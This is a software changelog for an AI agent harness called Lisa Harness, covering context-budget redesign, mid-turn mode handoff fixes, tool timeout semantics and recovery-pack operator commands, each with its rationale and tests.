# Changelog

All notable changes to the Lisa Harness will be documented in this file.

## [Unreleased]

### Removed

#### Dead context plumbing — unconsumed seams, always-zero budget fields, and the duplicate broker path

- **What:** Removed the eight pieces of dead or misleading context
  plumbing identified in the 2026-10-12 context-system review, under the
  "Dead context plumbing removal" freeze carve-out
  (`docs/CODING_WORKFLOW.md`): (1) `kernel/context/context_keys.py`
  (zero importers); (2) the never-invoked `DataSanitizer` seam —
  `seams.protocols.DataSanitizer`, `context/data_sanitizer.py`
  (`PassThroughSanitizer`), `ContextSeams.data_sanitizer`, and the
  vulture allowlist entry masking it (real redaction is the runtime's
  thread `ThreadRedactionPolicy`); (3) the write-only module-global
  extension-item builder (`set_extension_item_builder` /
  `reset_extension_item_builder`) and its sole wrapper
  `sdk.context.context_broker` +
  `sdk.context.extension_item_builder.set_production_extension_item_builder`
  (the turn loop receives the builder explicitly via
  `ContextSeams.extension_item_builder`); (4) the always-zero
  `stable_prefix_tokens` / `conversation_tokens` / `tool_schema_tokens`
  fields on `ContextMapperRequest` / `ContextBudgetSnapshot` (every
  caller passed 0, so the mapper's "model-aware budget" never subtracted
  them — the real enforcement point is `fit_request_context`);
  (5) the dead retrieval-lane budget knob
  `context_budget_retrieval_max_tokens` /
  `LISA_CONTEXT_BUDGET_RETRIEVAL_MAX_TOKENS` (the lane's only section is
  bypassed by the allocator by design); (6) the
  `publish_context_usage_event` stub (unwired event bus, stdlib log only)
  and with it the duplicated `drop_reason` key in
  `ContextBudgetAllocator.summary()`; (7) the single-caller
  `build_brokered_context_markdown` wrapper (callers use
  `build_session_mapped_context_markdown` directly); (8) the
  `lisa-context` MCP server (`mcp_server/context/`, its entry point,
  registry + launch-manifest entries, and tests) whose `broker_context`
  tool duplicated the in-process mapper path and was called by nothing in
  the repo — plus two renames of modules reduced to stale names:
  `kernel/context/context_broker.py` → `ambient.py` (ambient facts only)
  and `kernel/context/context_frames.py` → `content_registry.py` (now
  exposing a public `get_content_registry()` instead of the private
  `_content_registry` import), and the test-only
  `DiscoveryReport.notes` / `DiscoveryReport.results_for` accessors.
- **Why:** Dead seams and budget knobs that look enforced but are not
  make the context budget story read as stronger than it is, and unused
  config accrues readers.
- **Tests:** behavior-preserving deletions; the receipt is the full
  verification loop green (`runtime/tests/test_context_assembly.py`,
  `runtime/tests/test_context_selection.py`,
  `mcp_server/tests/test_cli_contract.py`,
  `mcp_server/tests/test_in_process_registry.py`,
  `mcp_server/tests/test_mcp_servers.py`,
  `runtime/src/runtime/model_discovery/tests/test_discover.py` updated or
  trimmed to stop referencing removed symbols).

### Added

#### Context residency by allocation — bounded replay working set, stub coherence, standing state ledger

- **What:** The three-rule residency design shipped under the
  "Context residency by allocation" freeze carve-out
  (`docs/SPEC/RESIDENCY_RFC.md`): (R2) the turn-start replay working set is
  recomputed under a byte budget — `build_open_task_messages` /
  `project_tool_messages` accept `budget_bytes`; three tighten-only layers
  set it: host ceiling `HostConfig.context_budget_replay_max_bytes`
  (65536, env `LISA_CONTEXT_BUDGET_REPLAY_MAX_BYTES`), session knob
  `context.history.replay_max_bytes`, core default 32768 (16KB noted as
  adequate most of the time). Over-budget replayed results collapse to
  recoverable ref-stubs; newest stay verbatim. (R1) stub recognition and
  page-pointer coherence fixes below. (R3) a standing state ledger rides the
  `## Turn Lifecycle` block every iteration: `_TurnState.active_refs`
  captures every `r<sha256>`/`t<turn>.m<idx>` ref tool outputs carry, and
  deterministic writes-landed/attempted + refs-held lines render from
  effect receipts — zero model tokens, O(work-done).
- **Why:** The thread store is lossless but context residency was not
  bounded: the replay path — the one context path the 8k lane budget never
  saw — replayed the open task's tool results verbatim, growing linearly
  (six 6KB results = 36KB). The 97%-prompt token split
  (`docs/TOKEN_BUDGET.md`) is the cost this exists to move.
- **Tests:** `runtime/tests/test_thread_replay.py`
  (bounded/unbounded working set; inventory refs expand to original bytes);
  `runtime/tests/test_replay_budget_wiring.py` (knob tightens, core default
  bounds, absent knob verbatim, knob cannot exceed env ceiling);
  `kernel/tests/test_session_plan.py::test_compile_session_plan_accepts_replay_max_bytes`;
  `kernel/tests/test_effect_receipts.py::
  test_dispatch_captures_active_refs_from_stub_envelopes`;
  `kernel/tests/test_control_channel.py::test_budget_briefing_carries_state_ledger_lines`,
  `test_budget_briefing_ledger_lines_omitted_when_empty`.

### Fixed

#### The turn's capability block kept describing the entry mode after a mid-turn handoff

- **What:** The mid-turn handoff path in
  `kernel/src/kernel/turn_runner/__init__.py`,
  `_execute_mid_turn_handoff`, now reassembles the turn's own user
  message (replaced in place at `state.transcript_start`; no new
  synthesized user messages) with the recompiled post-handoff capability
  manifest via the new `_recompile_manifest_and_refresh_user` /
  `_refresh_user_message_capability_block` helpers, threading
  `assemble_user` through the `_intercept_transition_stage` →
  `_intercept_mode_handoff` → `_dispatch_turn_tool_calls` →
  `_execute_prepared_tool_call` chain.
- **Why:** The capability block was assembled once at turn start against
  the entry mode's tool surface and never refreshed, even though the
  handoff rebuilds the tool surface and recompiles the manifest. The
  stale block — rendered `<authoritative>` by the host — stayed the
  newest user state: on the 2026-10-10 p920 turn 664, the executor handed
  off to `coding_execute` (36 coding tools advertised), read its own
  "mode: default / available_tools: 16" block, concluded the coding tools
  were unavailable, and reported the contradiction as a harness defect
  instead of implementing; the write-contract backstop then burned two
  more completions. The same staleness was present (and merely survived)
  on successful prior executor turns, e.g. 662.
- **Tests:** `kernel/tests/test_handoff_user_context_refresh.py`
  (post-handoff the newest user message names the active mode and the
  entry-mode block does not survive as newest; the refresh replaces in
  place — one capability block, one query line).

#### Approval-required tools were validated only after the approval pause

- **What:** `execute_tool` now calls an optional, effect-free module
  `preflight(ctx)` after parameter validation and before requesting
  approval. An error `ToolResult` from it is returned to the model as a
  normal in-turn tool error and no approval is requested; `None` proceeds
  to the approval pause. Receipt-bearing calls skip preflight because
  `execute` re-validates.
- **Why:** Approval ends the turn. A `coding_edit_files` batch (2026-10-09,
  turn 623) carried two `main.go` `old_text`s written from memory with
  three tabs instead of two; the mismatch surfaced only after the
  auto-approved `/approve`, in a recovery turn whose replayed working set
  no longer held the reads needed to correct it, so the model re-read
  everything and never landed the edit.
- **Tests:** `kernel/tests/test_approval.py::
  test_failed_preflight_returns_error_before_requesting_approval`,
  `test_passing_preflight_requests_approval_and_receipt_skips_it`.

#### Tool-result residency was a fixed 64KB with an 8KB per-result cap

- **What:** The provider-only projection kept at most 64KB of tool output
  per model call, and any single work result over 8KB (recall pages over
  32KB) was previewed even with the budget mostly free. Neither number
  looked at the model. The kernel now sizes the budget from the effective
  model's manifest `context_window` through one resolver,
  `kernel.context.context_budget.tool_context_budget_bytes`
  (`tool_context_window_share` 0.25 × window × 4 chars/token), and passes
  it to `ContextHooks.project_messages(..., budget_bytes=...)` on every
  model call. A model without a declared window falls back to
  `context_default_window_tokens` (131072 → 128KB), which the context
  mapper now shares instead of its own literal. The per-result caps are
  removed: a result stays verbatim whenever it fits the bytes newer results
  left. The turn-start replay ceiling and `replay_max_bytes` still bound
  what carries across turns.
- **Why:** A `coding_execute` turn (2026-10-09, turn 622) re-read seven
  12–15KB source files 3–4 times each and hit the 20-iteration cap with
  zero edits: every file was previewed on arrival by the 8KB cap, and the
  ~120KB working set thrashed through the 64KB budget.
- **Tests:** `kernel/tests/test_tool_context_budget.py`;
  `kernel/tests/test_turn_runner_prompt_segments.py::
  test_projection_budget_is_sized_from_the_model_context_window`;
  `sdk/tests/test_thread_search.py::TestProjectionBudgetOnlyResidency`.

#### Tool-result projection starved the model past the turn budget

- **What:** `project_tool_messages` decided residency from a turn-wide
  "pressure" flag computed over all raw tool bytes the turn ever produced,
  not what stayed resident. Once a turn passed 64KB of raw results the flag
  stuck: eviction left ~12KB resident, yet every new result became a
  ~400-char preview (a 600-char read became a *larger* preview), and every
  `thread_read_content` expansion was pointered back to its own ref, so
  expanding was a no-op. Projection now allocates newest-first against the
  resident budget: a result stays verbatim when it fits its per-result cap
  (8KB work, 32KB recall pages) and the bytes left after newer results;
  only results that do not fit are abbreviated (stored pages pointer,
  others persist and preview at one fixed 600+300 scale), and oldest
  groups then collapse into the evidence inventory. The graduated
  preview ramp is removed; stubs minted at older scales are still
  recognized. Verbatim results persist only when the inventory evicts them.
- **Why:** A `coding_execute` turn (2026-10-08, turn 618) re-read one file
  in shrinking windows (500→110→25→5 lines) and expanded the same refs
  repeatedly, hitting the 20-iteration cap with zero writes. Replaying the
  turn through the new allocator keeps every new read and expansion
  verbatim, with resident context at 55–63KB of the 64KB budget instead
  of ~12KB.
- **Tests:** `sdk/tests/test_thread_search.py::TestProjectionNewestFirstAllocation`;
  `TestProjectionPreviewScale`;
  `TestProjectionRetrievalPages::test_page_without_room_pointers_without_persisting`;
  `TestProjectionSmallWorkResultInline::test_result_without_room_is_not_inflated_into_a_preview`.

#### Router inputs and usage attribution were frozen at the turn's entry mode

- **What:** The per-iteration ``RouterRequest``'s ``route.mode_id``
  (documented as "the active mode id") and
  ``route.required_capabilities`` were captured at loop setup from the
  entry mode and never refreshed, so a CEL rule keying on the active mode
  could never match post-handoff iterations and a handoff target's
  required capabilities were silently dropped from the request.
  ``_wire_record_model_usage``'s closure captured the entry mode the same
  way, so ``per_mode_usage`` — the per-mode token accounting surfaced to
  hosts — billed every post-handoff completion to the entry mode,
  breaking ``record_model_usage``'s "the mode that actually ran the
  completion" contract. One writer now establishes the active mode's
  routing context (active mode id, required capabilities, and the
  per-mode model pin re-resolution) on the turn state — called once at
  entry and on every successful mid-turn handoff — and the router
  request, the iteration-model resolution, and the usage attribution all
  read it. This also single-sources the previously three-place
  truncation-rescue retry math (predicate, 2x budget, context-window cap,
  request clone) into ``_truncation_retry_budget``.
- **Why:** Found while auditing the 2026-10-08 model-pin fix for
  duplicate codepaths: the same loop-setup capture staleness that
  mis-pinned the model also froze the router's view of the active mode
  and the per-mode token accounting — today's logs billed all
  ``coding_execute`` glm tokens to ``mode=default``.
- **Tests:** ``kernel/tests/test_turn_runner.py::
  test_run_turn_handoff_router_sees_target_mode_inputs``,
  ``test_run_turn_handoff_attributes_usage_to_target_mode``;
  ``kernel/tests/test_streaming.py`` rescue tests pin the deduped retry
  math unchanged.

#### A mid-turn handoff kept the entry mode's model

- **What:** The turn entry path resolves the model once from
  `mode_models[entry_mode]`, and `_execute_mid_turn_handoff` swapped the
  prompt, tool surface, `mode_id`, and `ctx` — but never re-resolved the
  model. Post-handoff iterations kept running the entry mode's pin. The
  handoff now re-resolves the per-mode pin through the host's
  `resolve_model` seam with the entry path's precedence
  (`mode_models[target]` → the mode's authored `default_model` → the
  `default` mode's pin) and stores it on the turn state; the
  per-iteration model-resolution closure prefers it, and the router can
  still override per iteration. An unresolvable target pin keeps the
  current model rather than failing the handoff.
- **Why:** The 2026-10-08 dnsmasq-web thread: turns entered in `default`
  (pinned to glm-5.3:cloud) that handed off mid-turn to `coding_execute`
  (pinned to deepseek-v4.1-flash:cloud) kept running glm through every
  coding iteration — the same session ran the manifest's coding pin only
  when a turn happened to *enter* in coding mode. glm then
  reasoning-looped in `coding_execute` (the truncation-rescue fix
  addresses the symptom; this removes the misrouting that put the
  loop-prone model on the coding iterations at all).
- **Tests:** `kernel/tests/test_turn_runner.py::
  test_run_turn_handoff_re_resolves_mode_model_pin`,
  `test_run_turn_handoff_falls_back_to_default_pin_when_target_unpinned`,
  `test_run_turn_handoff_keeps_model_when_pin_unresolvable`.

#### The streaming tool-call fallback regenerated with no truncation rescue

- **What:** When a streamed generation ended
  `finish_reason='tool_calls'`, the streaming path fell back to a
  non-streaming `complete()` to rebuild the structured payload — but that
  regeneration had no truncation rescue: if it re-deliberated past its
  budget and stopped at `finish_reason='length'`, the turn ended on the
  "reached its token cap before emitting a tool call" abort with the
  degenerate reasoning tail surfaced as the response. The fallback now
  retries such a truncation once at a doubled budget (context-window-
  capped), the same predicate and shape as both sibling rescues (the
  truncated-stream rescue and the non-streaming truncation rescue).
- **Why:** Three consecutive turns on the 2026-10-08 dnsmasq-web thread
  burned their full 16384-token completion budgets on a "Let me output.
  Here. Go. OK. Writing." reasoning loop inside the fallback generation,
  dispatched zero writes, and ended with the same aborted-turn message —
  while every other truncation path in the turn loop already retried at
  2x. A reasoning model's fallback regeneration is a fresh generation
  with the same failure mode, not a payload copy.
- **Tests:** `kernel/tests/test_streaming.py::
  test_turn_runner_rescues_truncated_fallback_after_tool_calls_stream`.

#### `dispute_memory` looked up a different slice than `recall_memory`

- **What:** `dispute_memory` passed only `user_slug` to the `memory.get` /
  `memory.search` aliases while `recall_memory` passes all four identity
  scope fields. Both lookup paths now mirror recall's scoped parameters
  (`user_slug`, `workspace_id`, `surface_id`, `memory_scope`), so
  correction reaches exactly the records recall ranks.
- **Why:** The native memory backends scope their WHERE clause on all
  four identity fields, so a recall-surfaced lesson could not be disputed,
  and the model burned three consecutive turns on failed dispute lookups
  against a bad lesson it could see but not correct (2026-10-05 thread).
- **Tests:** `sdk/packs/memory/tests/test_dispute_memory.py` (scoped
  lookup reaches the recall slice; out-of-scope ids stay invisible).

#### Graduated-scale stubs were not recognized on re-projection (stub-of-a-stub)

- **What:** `_existing_result` recognized over-threshold preview stubs at
  only the two exact endpoint scale pairs. Stubs minted mid-ramp (the
  graduated 600→120 head-scale under pressure) that were later evicted by
  the working-set compactor were treated as fresh content and persisted
  as-is, so the evidence inventory's ref expanded to the stub's own JSON
  instead of the original bytes. Recognition now rebuilds the preview at
  the stub's own head/tail and compares — every scale is recognized while
  envelopes whose excerpts don't match the store are still rejected.
- **Why:** Coherence by address means one hop: the model expanding an
  inventory ref found a preview envelope whose `total_chars`/`head`/`tail`
  described the JSON, not the content, and needed a second expansion hop to
  reach the bytes (2026-10-07 replay-eviction finding).
- **Tests:** `runtime/tests/test_thread_replay.py::
  test_inventory_refs_expand_to_original_bytes_not_stub_json`.

#### Complete retrieval pages were persisted instead of pointered

- **What:** A complete (`has_more` false) retrieval-tool page whose `ref`
  already addressed stored content pointed only under turn pressure.
  Pages over `_MAX_RETRIEVAL_BYTES` (32KB) but under the turn ceiling
  (64KB) fell through a no-pointer window to `persist()`+preview — every
  replay of such a page created a fresh result object holding a copy of
  bytes the store already had, and the stub addressed the copy (two
  expansion hops). The pointer now fires whenever a complete stored page
  cannot stay resident inline; the `has_more` guard stands (a mid-page
  carries progress the original ref cannot reconstruct).
- **Why:** The page adds nothing the original ref cannot recover; a copy
  is a second address for the same bytes and inflates the result store on
  every over-threshold page read (Lisa-Harness/lisa#5).
- **Tests:** `sdk/tests/test_thread_search.py::
  TestProjectionRetrievalPages::test_over_threshold_page_pointers_without_pressure`.

#### Catalog loaders rewrote `timeout_seconds: 0` into the 30s default

- **What:** All three catalog loaders (runtime tool, runtime operation,
  markdown operation) used
  `int(metadata.get("timeout_seconds", 30) or 30)`; the falsy coercion
  rewrote a declared `timeout_seconds: 0` into the 30/60s default before the
  kernel ever saw it. The loaders now pass declared values through verbatim;
  a null value (`timeout_seconds:` with no value, a common authoring typo)
  degrades to the documented default instead of crashing the catalog build.
  The kernel's documented `0 disables the wrapper timeout` contract
  (`sdk/AUTHORING.md`) works as written. Negative values still round-trip and
  are rejected by the kernel's existing catalog validators.
- **Why:** The 2026-10-05 shell turn lost a command because `bash_run` /
  `bwrap_run` inherited the 30s wrapper default — the wrapper cancelled the
  call before the pack's sandboxed auto-background adoption could run, then
  killed the orphaned bwrap child and aborted the turn. The designed escape
  hatch for exactly this situation (`0` = tool self-bounds) was silently
  destroyed by the loader, leaving pack authors no correct way to declare a
  self-bounding tool.
- **Tests:** `sdk/tests/test_catalog_timeout_zero.py` (declared 0 and -5
  round-trip for all three loader paths; null value degrades to the default;
  omitted keeps the documented defaults).

#### Tool wrapper timeout for streaming tools is now an idle deadline

- **What:** `kernel.tools.registry.execute_tool` wraps every dispatch in a
  timeout. For tools that declare `stream_output: true` with an event bus
  wired, the wrapper now applies an *idle* deadline: each incremental output
  published on the `lisa.tool_output` topic resets the clock, so a tool that
  keeps producing (a long build streaming its log) runs as long as it stays
  alive, while a tool that goes silent for the full window is treated as hung
  and cancelled. Non-streaming tools keep the exact lifetime bound;
  `timeout_seconds: 0` still disables the wrapper; a streaming call without
  a bus degrades to the lifetime bound.
- **Why:** A static per-tool lifetime bound can't distinguish a hung call
  from legitimate long work, and it can never be sized to work that
  backgrounds itself — the alignment problem the 2026-10-05 incident exposed
  (packs forced to guess numbers larger than every internal duration, in
  order, forever). The progress signal streaming tools already publish is the
  real distinction; the wrapper now consumes it.
- **Composition:** A streaming tool delegating to another streaming tool
  (bash_run → bwrap_run) keeps its idle deadline across the nested dispatch:
  the child publishes under its own tool id the parent's subscription cannot
  match, so `publish_tool_output` also resets the enclosing frame's clock via
  a context-carried relay (`ToolExecutionContext.idle_progress_relay`). The
  wrapper's progress subscription is removed when the dispatch ends
  (`EventBus.unsubscribe` added to the seam), so no handler or context
  retention leaks per call.
- **Tests:** `kernel/tests/test_tool_wrapper_timeout.py` (streaming output
  resets the clock past the declared bound; silent streaming tool is
  cancelled; non-streaming keeps the lifetime bound even while publishing on
  the topic; `0` skips the deadline path entirely; no-bus degrade; subscription
  removed on success and timeout paths; nested child stream resets the parent
  clock; relay cleared after the call).

#### State-settling operator commands left no thread record

- **What:** The operator commands that decide pending work — `/cancel`,
  `/cancel-all`, `/skip`, `/skip-all`, `/retry`, `/retry-safe`, `/deny` —
  settled recovery records and approvals on disk but appended no thread
  entry. The host dispatch layer now records every state-settling command
  (builtin and pack-registered) with `operator-host-command` provenance and
  a `state_change` tag (`recovery_settled` / `approval_denied`), so the
  thread carries the operator's answer with the same durability `/approve`
  already had. Read-only commands (`/stalls`, `/stall`, `/help`) keep the
  no-entry behavior.
- **Why:** The 2026-10-05 stale-yield loop: the operator ran `/cancel-all`
  at 02:57:51Z, settling the three recovery items that backed the paused
  approval — but the thread tail still ended at "paused awaiting your
  decision (request 4803a869)". Nothing the model could read said the
  decision had been made, so every subsequent turn re-derived the same
  stale question.
- **Tests:** `runtime/tests/test_host_command_thread_entry.py` (pack
  state-settling command records an entry; `/deny` records an entry;
  read-only `/stalls` records nothing).

#### Thread digest items replayed recorded state as the live present

- **What:** The thread digest's retrieval-lane items (task state, recent
  history, open objectives) carried no past/present framing and no
  reconciliation against durable workflow state. Every digest body now closes
  with the recorded-past directive (the same framing the
  `recent_conversation` lane and thread readout pages already carry), history
  lines carry their recorded-at timestamps, and recorded approval blockers
  are annotated `[superseded (live approval store: <state>)]` when the
  approval store shows them consumed / approved / denied / cancelled /
  expired. The host resolves the live snapshot per turn in the async
  pre-turn path (`resolve_live_workflow_state`) and threads it through
  `build_unified_state` to the digest builders.
- **Why:** The 2026-10-05 turn-510 stale-yield loop: a policy-approved
  `bash_run` was killed by the wrapper timeout and its continuation turn
  died with the process, so the thread tail still read "paused awaiting your
  decision (request 4803a869)". The digest re-quoted that recorded blocker
  as current on every turn — in the task state, the open objectives, and the
  recent history — and the model faithfully re-yielded asking the operator
  to decide an already-consumed approval.
- **Tests:** `runtime/tests/test_thread_digest.py` (past/present framing on
  all three items; recorded-at timestamps on history lines; live-state
  reconciliation annotates superseded blockers, leaves unknown requests and
  still-`pending` approvals untouched — pending is the live present, not a
  resolved outcome; resolver and tail-collector helpers);
  `runtime/tests/test_state_provider.py` (digest seam threads the live-state
  snapshot).

### Changed

#### Operator command vocabulary moved to the runtime seam (BREAKING)

- **What:** Kernel-owned prompt prose no longer embeds operator command
  syntax (`/approve`, `/deny`, `/skip <id>`, `/cancel <id>`,
  `/retry <id>`, `/stalls`). The lifecycle resolver and
  `render_approval_request` now state the pause neutrally and attach
  structured remediation — `YieldRemediation` /
  `YieldRemediationAction` (verb + target id + `safe` flag, an open
  verb vocabulary) on `YieldAction.remediation` — and the runtime
  renders installed pack command lines into `data["remediation"]` at
  its delivery seam. A verb no installed command exposes renders
  nothing. The never-called, never-tested `kernel.recovery` public
  function `step_blocks_instance()` was removed with this move.
- **Why:** The kernel is runtime- and pack-neutral by contract, but the
  lifecycle resolver embedded recovery-pack slash syntax and
  `kernel.approval` rendered `/approve //deny` into user prompts —
  import-linter cannot see prose couplings, and installing the recovery
  pack silently changed kernel-owned prompt content, an inversion of
  the declared boundary.
- **BREAKING for hosts:** `render_approval_request` output no longer
  contains `/approve` / `/deny` syntax, and yield questions carry no
  command syntax. Hosts must consume the structured
  `data["approval"]` payload and `data["remediation"]` lines (or the
  structured `YieldAction.remediation` verbs) instead of
  pattern-matching the old prose.
- **Tests:** `kernel/tests/test_lifecycle_resolver.py` (structured verbs
  pinned, question free of command syntax),
  `runtime/tests/test_approval_commands.py` (runtime-rendered hints for
  installed/absent commands), `kernel/tests/
  test_recovery_provenance_conformance.py` (new — locks the cross-package
  string contracts import-linter cannot see).

#### Lockfile refresh with transitive bumps (lockfile revision 3 → 5)

- **What:** `uv.lock` regenerated with transitive bumps only — no direct
  dependency changes in any `pyproject.toml` — notably
  `pydantic` 2.3.1 → 2.4.0, `typing-extensions`, `certifi`, and
  related transitive updates.
- **Why:** Lockfile-format revision bump (3 → 5) with the workspace tooling
  refresh; recorded here because pydantic is a runtime behavior surface of
  the frozen trees.

#### bash/bwrap packs declare self-bounding tools (`timeout_seconds: 0`)

- **What:** `bash_run.tool.yml` and `bwrap_run.tool.yml` now declare
  `timeout_seconds: 0` (kernel wrapper disabled) instead of the inherited 30s
  default. Both tools self-bound on every path — the model's own
  `timeout_seconds` parameter is the visible wait, the sandboxed
  auto-background grace window adopts slow commands as jobs, and
  `stream_output: true` publishes observable progress on `lisa.tool_output`.
- **Why:** The 2026-10-05 shell turn: the wrapper killed `bash_run` at 30s,
  then the in-flight `bwrap_run` child at 33s, stranding the command and
  aborting the turn ("Task exception was never retrieved"). No wrapper
  number can be sized to work that backgrounds itself; the packs declare the
  contract instead of the number.
- **Tests:** `lisa-packs/bash` `tests/test_catalog.py`
  `test_bash_run_declares_itself_self_bounding`; `lisa-packs/bwrap`
  `tests/test_catalog.py` `test_bwrap_run_declares_itself_self_bounding`.

#### packstest accepts self-bounding tool declarations

- **What:** `packstest`'s tool-yaml validation rejected `timeout_seconds <= 0`
  with "must be > 0", mis-modeling the kernel contract (`0` disables the
  wrapper; only negatives are invalid). The rule would have failed validation
  of the packs' self-bounding declarations. It now mirrors the kernel rule.
- **Tests:** `packstest/tests/test_self.py`
  `test_validate_pack_accepts_self_bounding_tool_timeout_zero`,
  `test_validate_pack_rejects_negative_tool_timeout`.

### Added

#### `planner` and `explainer` modes moved into `lisa-pack-core`

- **What:** The `planner` and `explainer` workflow front-end modes now
  ship in the in-repo core pack instead of the external
  `lisa-pack-personas`, whose mode catalog trims to `thinker` +
  `researcher`. Mode ids, front matter, and routing are unchanged; only
  `mode_provider_id` changed to `lisa-pack-core` (no duplicate
  `mode_id`s remain across the two packs).
- **Why:** Both modes are kernel workflow front-ends, not personas:
  `planner` is the public surface for `plan_workflow` +
  `needs_full_mode_catalog` routing, `explainer` is the
  guaranteed-productive terminal mode for the
  forced-transition-before-cap path — the core pack is their durable
  owner.

#### Bulk dismiss commands for the recovery pack

- **What:** Two new operator slash commands, `/skip-all` and `/cancel-all`,
  settle every open (stalled, indeterminate) recovery work item in one
  command regardless of retry policy, mirroring the per-id `/skip <id>` and
  `/cancel <id>` semantics. Running items — mid-flight for the current turn
  — are deliberately left alone.
- **Why:** Clearing a backlog of stalls previously required one `/skip <id>`
  per item, each requiring a fresh message; there was no scriptable bulk
  remediation except `/retry-safe`, which only covers read-only items.
- **Tests:** `sdk/packs/recovery/tests/test_recovery_commands.py`
  `test_skip_all_settles_every_open_item`, `test_cancel_all_settles_every_open_item`,
  `test_bulk_dismiss_skips_running_items`, `test_bulk_dismiss_no_open_items_returns_message`.
- **E2E:** `skipped 1/1 … [skipped/confirm]` verified by the new live
  scenario `sdk/packs/recovery/tests/e2e/skip_all.scenario.yml`.

### Fixed

#### Read-only MCP tools no longer stall workflows as approval-gated work items

- **What:** Recovery records for opaque MCP tools were hardcoded to
  `effect: execute` with `retry_policy: confirm`, ignoring the
  server-declared `read_only_hint` on the pool tool spec. The kernel now
  resolves the effect from the spec: read-only tools (all `lisa-storage`
  and `lisa-thread` calls) record `effect: read` / `retry_policy: safe`;
  tools without the hint keep `execute` / `confirm` (fail closed). The
  record now agrees with the effect receipt the same call already records.
- **Why:** A stalled `confirm` record blocks the whole workflow behind a
  confirm gate (`/retry` needs an operator decision), and one-shot hosts
  (`lisa prompt`) cannot answer approval prompts — every read-only storage
  or thread call that stalled produced an unresolvable approval loop.
- **Tests:** `kernel/tests/test_turn_runner_tool_dispatch.py`
  `test_read_only_mcp_tool_recovery_record_is_read_effect` (fails against
  the pre-fix code), `test_effectful_mcp_tool_recovery_record_stays_execute`
  (pins the fail-closed contract).

#### `/retry-safe` (and other bulk command prefixes) were unreachable

- **What:** The host's pack-command dispatch matches `lowered.startswith(prefix)`
  in registration order. The recovery pack registered `/retry-safe` *after*
  `/retry`, so `/retry-safe` always matched `/retry` and returned
  `Usage: /retry <work_item_id>` — the documented bulk-retry command could
  never run. The pack now registers longer prefixes before their shorter
  shadows (`/retry-safe` before `/retry`; the same guard applies to the new
  `/skip-all` vs `/skip` and `/cancel-all` vs `/cancel` pairs).
- **Why:** Silent shadowing between sibling prefix commands: the handler
  chain never reached the batch handler, so `/retry-safe` stalls persisted.
- **Tests:** `sdk/packs/recovery/tests/test_recovery_commands.py`
  `test_get_host_commands_orders_longest_prefixes_first` (fails against the
  old registration order, in which `/retry` preceded `/retry-safe`).

### Fixed

#### Recovery-stall workflow gate works again after checkpoint trim

- **What:** The lifecycle resolver's priority-2 recovery-stall yield works
  against real `RecoveryRecord` models again. The checkpoint trim
  (2026-08-22) removed `RecoveryRecord.blocks_workflow` as written-but-never-
  read, but the resolver gate still read it via `getattr(record, "blocks_workflow",
  False)` — so every real record failed the gate, and approval-pending stalls
  never re-yielded on subsequent turns. The gate now keys on a new sentinel,
  `kernel.recovery.RECOVERY_APPROVAL_PENDING_ERROR`, which the dispatch layer
  writes as `last_error` when a work item stalls on `ApprovalRequired`.
  Approval-pending stalls block the workflow again (matching pre-trim
  behavior); ordinary tool-failure stalls still return to the model as tool
  results and never re-yield.
- **Why:** Silent death of a priority-2 lifecycle gate with no failure
  signal — the test suite's duck-typed fixtures still carried the ghost
  `blocks_workflow` attribute, so 43 resolver tests stayed green while the
  production path was unreachable. A `_RecoveryRecordLike` protocol-
  conformance assertion now locks the resolver protocol to the real model.
- **Tests:** `kernel/tests/test_lifecycle_resolver.py`
  `test_stalled_blocking_record_forces_yield` (real-model fixture, fails
  against the ghost gate), `test_tool_failure_stall_does_not_block`,
  `test_real_record_satisfies_resolver_protocol`. New
  `runtime/tests/test_recovery_provenance_conformance.py` locks the
  cross-package string contracts the import-linter cannot see: the
  thread-provenance keys `handle_message` writes against the readers in
  `runtime.approval.orchestration` (paired settlement, drift orphans
  stalls — the 2026-08-06 zombie-stall mechanism), the identity-mirroring
  between `kernel.turn_runner._build_recovery_identity` and
  `_recovery_identity_for_invocation`, and the sentinel the kernel
  settles with.

#### Verbose tool previews lead with payload, not envelope JSON

- **What:** `tool_dispatch_complete`'s `result_preview` is now a compact
  payload-first `key=value` summary for JSON-object tool outputs (content
  quoted first, then short scalars like `total_chars`/`has_more`), instead
  of the raw first 200 chars. The event also carries `result_chars`, the
  true output size, and `_settle_recovery` stores the same summary in
  `RecoveryRecord.result_preview` (which feeds
  `WorkflowPosition.step_results`). Plain-text outputs keep the legacy
  raw-truncation behavior.
- **Why:** The 2026-10-02 thread-provenance work serializes `ref` and
  `source` metadata ahead of `content` in every read/search envelope, so
  `lisa prompt -v` rendered raw JSON labels — for `r<sha256>` refs the
  65-char hash plus interpretation prose consumed the entire 200-char
  window and no content ever showed.
- **Tests:** `kernel/tests/test_turn_runner_tool_dispatch.py`
  `test_summarize_json_result_*`;
  `kernel/tests/test_turn_runner.py`
  `test_run_turn_emits_summarized_json_result_preview`; the CLI pins
  both the `⎿ 5.412k chars` true-size row summary and the payload-first
  detail line in `hosts/cli/tests/test_prompt_transport.py`.

#### Truncated prose ends the turn instead of arming the write backstop

- **What:** A completion that stops at the token cap with prose and no tool
  call now ends the turn and names the cap, after the existing rescue has
  already retried at a doubled budget. Previously it fell through to the
  write-contract backstop, which synthesized an argument-less action-tool
  dispatch. An empty truncated completion still yields as before.
- **Why:** The synthesized dispatch could only fail validation, fail its
  approval, and be replayed by the host as a fresh turn — the 2026-09-30
  executor loop: four cycles, 220k-token prompts, zero bytes written.
- **Tests:** `test_truncated_prose_ends_the_turn_instead_of_arming_the_backstop`;
  `test_empty_natural_completion_logs_diagnostic_warning` still pins the yield.

#### Failed-approval retries no longer nest the continuation query

- **What:** The continuation query for a failed approved action quoted the
  paused turn's query. On a retry that turn *is* the previous synthesized
  continuation, so each cycle nested the whole failure preamble one level
  deeper. `_origin_request_query` now resolves the first non-command turn
  sharing the paused turn's `provenance.task_id`, for both the failure and
  the success (`_continuation_directive`) paths.
- **Why:** Observed live: four retry cycles grew a single turn's prompt from
  24k to 220k tokens, each model call capping at 32768 completion tokens and
  taking up to 177s, while the real user request sank to the bottom of a
  three-deep nest. No bytes were ever written.
- **Tests:**
  `test_failed_continuation_quotes_the_task_origin_not_the_previous_retry`
  builds a two-deep retry chain and pins a single `The original request was:`.

#### Configured-but-absent pack owners are inert, not fatal

- **What:** `SessionCapabilityBindings` raised `ValueError` when session
  configuration named an owner with no catalog capabilities. It now logs a
  warning and leaves the configuration inert.
- **Why:** The shipped default session plan sets a sandbox floor for
  `lisa-pack-bwrap` without requiring or including it, so `build_turn_hooks`
  crashed on every turn whenever that optional pack was not installed. This
  matches the documented `include`-but-not-installed contract: absent packs
  are silently skipped, not a startup error.
